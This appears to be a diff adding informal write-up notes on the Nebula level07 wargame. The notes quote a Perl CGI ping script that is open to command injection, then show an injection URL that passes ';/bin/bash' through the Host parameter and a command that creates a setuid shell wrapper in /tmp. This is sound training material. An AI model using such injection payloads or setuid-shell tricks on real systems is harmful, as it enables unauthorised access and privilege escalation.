@@ -1,0 +1,38 @@
+Question URL: https://exploit.education/nebula/level-07/
+
+Source Code:(index.cgi)
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ping {
+  $host = $_[0];
+
+  print("<html><head><title>Ping results</title></head><body><pre>");
+
+  @output = `ping -c 3 $host 2>&1`;
+  foreach $line (@output) { print "$line"; }
+
+  print("</pre></body></html>");
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param("Host"));
+
+Information gathering:
+a. httpd is running as flag07
+level07@nebula:/home/flag07$ ps -ef | grep http
+flag07    1383     1  0 03:34 ?        00:00:00 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
+
+b. Paramter can be passed into CGI program. On the above source code, index.cgi receives Host parameter as URL parameter type
+CGI receives parameter through URL with the format of "index.cgi?name=value&name2=value2&..."
+e.g.) http://192.168.10.133:7007/index.cgi?Host=www.google.com <= Host will be fed with www.google.com
+
+c. As you can see, we can pass any commands to cgi program as a passing Host value
+http://192.168.10.133:7007/index.cgi?Host=;/bin/bash <== This will be replaced like ping -c 3 ;/bin/bash 
+
+ echo '#!/bin/bash;/bin/bash' > /tmp/test;chmod +s /tmp/test
